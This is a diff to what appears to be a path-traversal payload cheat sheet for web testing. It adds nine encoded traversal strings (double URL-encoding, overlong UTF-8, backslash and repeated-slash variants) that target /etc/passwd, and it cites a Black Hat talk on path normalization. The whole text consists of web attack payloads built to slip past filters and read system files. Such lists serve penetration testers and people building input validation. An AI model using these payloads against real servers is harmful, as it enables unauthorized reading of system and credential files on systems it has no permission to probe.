@@ -22,6 +22,15 @@ above tricks work well when you have a ngnix server in front of an tomcat
 ../../../../../../../../../../../../etc/passwd%00
 //..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 /..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+%252e%252e%252fetc%252fpasswd
+...//....//etc/passwd
+..///////..////..//////etc/passwd
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 
 
 References:- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
